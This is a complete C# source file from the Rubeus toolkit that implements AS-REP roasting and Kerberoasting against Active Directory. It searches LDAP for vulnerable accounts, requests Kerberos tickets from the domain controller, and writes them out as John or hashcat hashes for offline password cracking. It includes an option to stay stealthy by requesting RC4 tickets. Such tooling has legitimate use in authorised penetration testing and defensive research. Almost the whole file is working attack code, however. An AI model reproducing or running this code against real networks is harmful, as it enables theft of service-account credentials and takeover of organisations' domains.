using System;
using Asn1;
using System.IO;
using ConsoleTables;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using Rubeus.lib.Interop;

namespace Rubeus
{
    public class Roast
    {
        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "")
        {
            if (!String.IsNullOrEmpty(userName))
            {
                Console.WriteLine("[*] Target User            : {0}", userName);
            }
            if (!String.IsNullOrEmpty(OUName))
            {
                Console.WriteLine("[*] Target OU              : {0}", OUName);
            }
            if (!String.IsNullOrEmpty(domain))
            {
                Console.WriteLine("[*] Target Domain          : {0}", domain);
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                Console.WriteLine("[*] Target DC              : {0}", domainController);
            }

            Console.WriteLine();

            if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))
            {
                // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
                GetASRepHash(userName, domain, domainController, format, outFile);
            }
            else
            {
                DirectoryEntry directoryObject = null;
                DirectorySearcher userSearcher = null;

                try
                {
                    if (String.IsNullOrEmpty(domainController))
                    {
                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                    }
                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, domainController, domain);
                    userSearcher = new DirectorySearcher(directoryObject);
                    // enable LDAP paged search to get all results, by pages of 1000 items
                    userSearcher.PageSize = 1000;
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                // check to ensure that the bind worked correctly
                try
                {
                    string dirPath = directoryObject.Path;
                    if (String.IsNullOrEmpty(dirPath))
                    {
                        Console.WriteLine("[*] Searching the current domain for AS-REP roastable users");
                    }
                    else
                    {
                        Console.WriteLine("[*] Searching path '{0}' for AS-REP roastable users", dirPath);
                    }
                }
                catch (DirectoryServicesCOMException ex)
                {
                    if (!String.IsNullOrEmpty(OUName))
                    {
                        Console.WriteLine("\r\n[X] Error validating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error validating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                try
                {
                    string userSearchFilter = "";

                    if (String.IsNullOrEmpty(userName))
                    {
                        userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                    }
                    else
                    {
                        userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
                    }
                    if (!String.IsNullOrEmpty(ldapFilter))
                    {
                        userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                    }
                    userSearcher.Filter = userSearchFilter;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                    return;
                }

                try
                {
                    SearchResultCollection users = userSearcher.FindAll();

                    if (users.Count == 0)
                    {
                        Console.WriteLine("[X] No users found to AS-REP roast!");
                    }

                    foreach (SearchResult user in users)
                    {
                        string samAccountName = user.Properties["samAccountName"][0].ToString();
                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                        Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                        Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);

                        GetASRepHash(samAccountName, domain, domainController, format, outFile);
                    }
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                    }
                    return;
                }
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
            }
        }

        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
        {
            // roast AS-REPs for users without pre-authentication enabled

            string dcIP = Networking.GetDCIP(domainController, true, domain);
            if (String.IsNullOrEmpty(dcIP)) { return; }

            Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();

            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
            if (response == null)
            {
                return;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                Console.WriteLine("[+] AS-REQ w/o preauth successful!");

                // parse the response to an AS-REP
                AS_REP rep = new AS_REP(response);

                // output the hash of the encrypted KERB-CRED in a crackable hash form
                string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
                repHash = repHash.Insert(32, "$");

                string hashString = "";
                if (format == "john")
                {
                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                }
                else if (format == "hashcat")
                {
                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                }
                else
                {
                    Console.WriteLine("Please provide a cracking format.");
                }

                if (!String.IsNullOrEmpty(outFile))
                {
                    string outFilePath = Path.GetFullPath(outFile);
                    try
                    {
                        File.AppendAllText(outFilePath, hashString + Environment.NewLine);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception: {0}", e.Message);
                    }
                    Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                }
                else
                {
                    Console.WriteLine("[*] AS-REP hash:\r\n");

                    // display the base64 of a hash, columns of 80 chararacters
                    if (Rubeus.Program.wrapTickets)
                    {
                        foreach (string line in Helpers.Split(hashString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", hashString);
                    }
                    Console.WriteLine();
                }
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
        }

        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false, bool enterprise = false)
        {
            if (userStats)
            {
                Console.WriteLine("[*] Listing statistics about target users, no ticket requests being performed.");
            }
            else if (TGT != null)
            {
                Console.WriteLine("[*] Using a TGT /ticket to request service tickets");
            }
            else if (useTGTdeleg || String.Equals(supportedEType, "rc4opsec"))
            {
                Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user");
                byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                TGT = new KRB_CRED(delegTGTbytes);
                Console.WriteLine("[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else");
            }
            else
            {
                Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
            }

            if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))
            {
                Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");
                return;
            }

            if (!String.IsNullOrEmpty(spn))
            {
                Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);

                if (TGT != null)
                {
                    // if a TGT .kirbi is supplied, use that for the request
                    //      this could be a passed TGT or if TGT delegation is specified
                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                }
                else
                {
                    // otherwise use the KerberosRequestorSecurityToken method
                    GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
                }
            }
            else if ((spns != null) && (spns.Count != 0))
            {
                foreach (string s in spns)
                {
                    Console.WriteLine("\r\n[*] Target SPN             : {0}", s);

                    if (TGT != null)
                    {
                        // if a TGT .kirbi is supplied, use that for the request
                        //      this could be a passed TGT or if TGT delegation is specified
                        GetTGSRepHash(TGT, s, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                    }
                    else
                    {
                        // otherwise use the KerberosRequestorSecurityToken method
                        GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);
                    }
                }
            }
            else
            {
                if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
                {
                    if (!String.IsNullOrEmpty(userName))
                    {
                        if (userName.Contains(","))
                        {
                            Console.WriteLine("[*] Target Users           : {0}", userName);
                        }
                        else
                        {
                            Console.WriteLine("[*] Target User            : {0}", userName);
                        }
                    }
                    if (!String.IsNullOrEmpty(domain))
                    {
                        Console.WriteLine("[*] Target Domain          : {0}", domain);
                    }
                    if (!String.IsNullOrEmpty(OUName))
                    {
                        Console.WriteLine("[*] Target OU              : {0}", OUName);
                    }
                }

                // inject ticket for LDAP search if supplied
                if (TGT != null)
                {
                    byte[] kirbiBytes = null;
                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;
                    // referral TGT is in use, we need a service ticket for LDAP on the DC to perform the domain searcher
                    if (ticketDomain != domain)
                    {
                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
                        Ticket ticket = TGT.tickets[0];
                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;

                        // request a service tickt for LDAP on the target DC
                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);

                    }
                    // otherwise inject the TGT to perform the domain searcher
                    else
                    {
                        kirbiBytes = TGT.Encode().Encode();
                    }
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                DirectoryEntry directoryObject = null;
                DirectorySearcher userSearcher = null;

                try
                {
                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, dc, domain);
                    userSearcher = new DirectorySearcher(directoryObject);
                    // enable LDAP paged search to get all results, by pages of 1000 items
                    userSearcher.PageSize = 1000;
                }
                catch (Exception ex)
                {
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                // check to ensure that the bind worked correctly
                try
                {
                    string dirPath = directoryObject.Path;
                    if (String.IsNullOrEmpty(dirPath))
                    {
                        Console.WriteLine("[*] Searching the current domain for Kerberoastable users");
                    }
                    else
                    {
                        Console.WriteLine("[*] Searching path '{0}' for Kerberoastable users", dirPath);
                    }
                }
                catch (DirectoryServicesCOMException ex)
                {
                    if (!String.IsNullOrEmpty(OUName))
                    {
                        Console.WriteLine("\r\n[X] Error validating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error validating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                try
                {
                    string userFilter = "";

                    if (!String.IsNullOrEmpty(userName))
                    {
                        if (userName.Contains(","))
                        {
                            // searching for multiple specified users, ensuring they're not disabled accounts
                            string userPart = "";
                            foreach (string user in userName.Split(','))
                            {
                                userPart += String.Format("(samAccountName={0})", user);
                            }
                            userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
                        }
                        else
                        {
                            // searching for a specified user, ensuring it's not a disabled account
                            userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
                        }
                    }
                    else
                    {
                        // if no user specified, filter out the krbtgt account and disabled accounts
                        userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
                    }

                    string encFilter = "";
                    if (String.Equals(supportedEType, "rc4opsec"))
                    {
                        // "opsec" RC4, meaning don't RC4 roast accounts that support AES
                        Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
                        encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                    }
                    else if (String.Equals(supportedEType, "aes"))
                    {
                        // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
                        Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
                        encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                    }

                    // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
                    //       then RC4 tickets would NOT be returned, so the original filter was:
                    //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
                    //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
                    //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
                    //  userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";

                    //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
                    //      so this fine-grained filtering is not needed

                    string userSearchFilter = "";
                    if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
                    {
                        if (String.IsNullOrEmpty(pwdSetAfter))
                        {
                            pwdSetAfter = "01-01-1601";
                        }
                        if (String.IsNullOrEmpty(pwdSetBefore))
                        {
                            pwdSetBefore = "01-01-2100";
                        }

                        Console.WriteLine("[*] Searching for accounts with lastpwdset from {0} to {1}", pwdSetAfter, pwdSetBefore);

                        try
                        {
                            DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
                            DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
                            string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
                            userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
                        }
                        catch
                        {
                            Console.WriteLine("\r\n[X] Error parsing /pwdsetbefore or /pwdsetafter, please use the format 'MM-dd-yyyy'");
                            return;
                        }
                    }
                    else
                    {
                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
                    }

                    if (!String.IsNullOrEmpty(ldapFilter))
                    {
                        userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                    }

                    userSearcher.Filter = userSearchFilter;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                    return;
                }

                try
                {
                    if (resultLimit > 0)
                    {
                        userSearcher.SizeLimit = resultLimit;
                        Console.WriteLine("[*] Up to {0} result(s) will be returned", resultLimit.ToString());
                    }

                    SearchResultCollection users = userSearcher.FindAll();

                    if (users.Count == 0)
                    {
                        Console.WriteLine("\r\n[X] No users found to Kerberoast!");
                    }
                    else
                    {
                        Console.WriteLine("\r\n[*] Total kerberoastable users : {0}\r\n", users.Count);
                    }

                    // used to keep track of user encryption types
                    SortedDictionary<Interop.SUPPORTED_ETYPE, int> userETypes = new SortedDictionary<Interop.SUPPORTED_ETYPE, int>();
                    // used to keep track of years that users had passwords last set in
                    SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();

                    foreach (SearchResult user in users)
                    {
                        string samAccountName = user.Properties["samAccountName"][0].ToString();
                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                        string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();


                        DateTime? pwdLastSet = null;
                        if (user.Properties.Contains("pwdlastset"))
                        {
                            long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
                            pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
                        }

                        Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                        if (user.Properties.Contains("msDS-SupportedEncryptionTypes"))
                        {
                            supportedETypes = (Interop.SUPPORTED_ETYPE)user.Properties["msDS-SupportedEncryptionTypes"][0];
                        }

                        if (!userETypes.ContainsKey(supportedETypes))
                        {
                            userETypes[supportedETypes] = 1;
                        }
                        else
                        {
                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
                        }

                        if (pwdLastSet == null)
                        {
                            // pwdLastSet == null with new accounts and
                            // when a password is set to never expire
                            if (!userPWDsetYears.ContainsKey(-1))
                                userPWDsetYears[-1] = 1;
                            else
                                userPWDsetYears[-1] += 1;
                        }
                        else
                        {
                            int year = pwdLastSet.Value.Year;
                            if (!userPWDsetYears.ContainsKey(year))
                                userPWDsetYears[year] = 1;
                            else
                                userPWDsetYears[year] += 1;
                        }

                        if (!userStats)
                        {
                            if (!simpleOutput)
                            {
                                Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                                Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                                Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
                                Console.WriteLine("[*] PwdLastSet             : {0}", pwdLastSet);
                                Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
                            }

                            if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
                            {
                                servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
                            }
                            if (TGT != null)
                            {
                                // if a TGT .kirbi is supplied, use that for the request
                                //      this could be a passed TGT or if TGT delegation is specified

                                if (String.Equals(supportedEType, "rc4") &&
                                        (
                                            ((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
                                            ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)
                                        )
                                   )
                                {
                                    // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                                }
                                else
                                {
                                    // otherwise don't force RC4 - have all supported encryption types for opsec reasons
                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
                                }
                            }
                            else
                            {
                                // otherwise use the KerberosRequestorSecurityToken method
                                GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                            }
                        }
                    }

                    if (userStats)
                    {
                        var eTypeTable = new ConsoleTable("Supported Encryption Type", "Count");
                        var pwdLastSetTable = new ConsoleTable("Password Last Set Year", "Count");
                        Console.WriteLine();

                        // display stats about the users found
                        foreach (var item in userETypes)
                        {
                            eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());
                        }
                        eTypeTable.Write();

                        foreach (var item in userPWDsetYears)
                        {
                            pwdLastSetTable.AddRow(item.Key.ToString(), item.Value.ToString());
                        }
                        pwdLastSetTable.Write();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex);
                    return;
                }
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
            }
        }

        public static void GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
        {
            // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach

            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                // extract the domain name from the distinguishedname
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                domain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            try
            {
                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
                //  GetRequest() stream was constributed to PowerView by @machosec
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                if (cred != null)
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                }
                else
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                }
                byte[] requestBytes = ticket.GetRequest();

                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                {
                    Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                    return;
                }

                // ignore the GSSAPI frame
                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                AsnElt apRep = AsnElt.Decode(apReqBytes);

                if (apRep.TagValue != 14)
                {
                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
                }

                long encType = 0;

                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {
                                            //Ensure checksum is extracted from the end for aes keys
                                            int checksumStart = cipherText.Length - 24;
                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }
                                        //if encType==23
                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }

                                        if (!String.IsNullOrEmpty(outFile))
                                        {
                                            string outFilePath = Path.GetFullPath(outFile);
                                            try
                                            {
                                                File.AppendAllText(outFilePath, hash + Environment.NewLine);
                                            }
                                            catch (Exception e)
                                            {
                                                Console.WriteLine("Exception: {0}", e.Message);
                                            }
                                            Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                                        }
                                        else if (simpleOutput)
                                        {
                                            Console.WriteLine(hash);
                                        }
                                        else
                                        {
                                            if (Rubeus.Program.wrapTickets)
                                            {
                                                bool header = false;
                                                foreach (string line in Helpers.Split(hash, 80))
                                                {
                                                    if (!header)
                                                    {
                                                        Console.WriteLine("[*] Hash                   : {0}", line);
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("                             {0}", line);
                                                    }
                                                    header = true;
                                                }
                                            }
                                            else
                                            {
                                                Console.WriteLine("[*] Hash                   : {0}", hash);
                                            }
                                            Console.WriteLine();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            }
        }

        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
        {
            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
            string userDomain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                // extract the domain name from the distinguishedname
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            // extract out the info needed for the TGS-REQ request
            string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
            string domain = TGT.enc_part.ticket_info[0].prealm;
            Ticket ticket = TGT.tickets[0];
            byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;

            // request the new service ticket
            byte[] tgsBytes = null;
            if (domain != userDomain)
            {
                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);
            }
            else
            {
                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
            }

            if (tgsBytes != null)
            {
                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
                DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
                Console.WriteLine();
            }
        }

        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)
        {
            // output the hash of the encrypted KERB-CRED service ticket in a kerberoast hash form

            int encType = cred.tickets[0].enc_part.etype;
            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            string domainName = cred.enc_part.ticket_info[0].prealm;
            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());

            string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);

            string hash = "";
            //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.
            if ((encType == 18) || (encType == 17))
            {
                int checksumStart = cipherText.Length - 24;
                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
            }
            //if encType==23
            else
            {
                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                string outFilePath = Path.GetFullPath(outFile);
                try
                {
                    File.AppendAllText(outFilePath, hash + Environment.NewLine);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception: {0}", e.Message);
                }
                Console.WriteLine("[*] Hash written to {0}", outFilePath);
            }
            else if (simpleOutput)
            {
                Console.WriteLine(hash);
            }
            else
            {
                bool header = false;
                if (Rubeus.Program.wrapTickets)
                {
                    foreach (string line in Helpers.Split(hash, 80))
                    {
                        if (!header)
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("[*] Hash                   : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("  Kerberoast Hash       :  {0}", line);
                            }
                        }
                        else
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("                             {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                           {0}", line);
                            }
                        }
                        header = true;
                    }
                }
                else
                {
                    if (kerberoastDisplay)
                    {
                        Console.WriteLine("[*] Hash                   : {0}", hash);
                    }
                    else
                    {
                        Console.WriteLine("  Kerberoast Hash       :  {0}", hash);
                    }
                }
            }
        }
    }
}
